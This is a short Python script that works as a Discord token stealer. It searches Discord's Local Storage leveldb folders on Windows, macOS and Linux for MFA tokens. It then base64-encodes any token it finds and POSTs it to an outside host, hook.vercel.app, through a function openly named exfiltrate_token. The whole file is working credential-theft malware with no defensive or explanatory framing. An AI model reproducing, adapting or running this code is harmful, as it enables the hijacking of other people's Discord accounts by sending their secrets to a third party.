import os
import json
import base64
import requests

def find_discord_token():
    paths = [
        os.path.expanduser("~/.config/discord/Local Storage/leveldb/"),
        os.path.expanduser("~/AppData/Roaming/discord/Local Storage/leveldb/"),
        os.path.expanduser("~/Library/Application Support/discord/Local Storage/leveldb/")
    ]
    for path in paths:
        if os.path.exists(path):
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                try:
                    with open(os.path.join(path, file_name), errors='ignore') as f:
                        for line in f:
                            if 'mfa.' in line:
                                token = json.loads(line.strip())['token']
                                return token
                except:
                    pass
    return None

def exfiltrate_token(token: str):
    # Exfiltrate via HTTP POST to hook
    data = json.dumps({"type": "discord_token", "token": token})
    encrypted = base64.b64encode(data.encode()).decode()
    requests.post("https://hook.vercel.app/api/hook", json={"data": encrypted})

if __name__ == "__main__":
    token = find_discord_token()
    if token:
        exfiltrate_token(token)
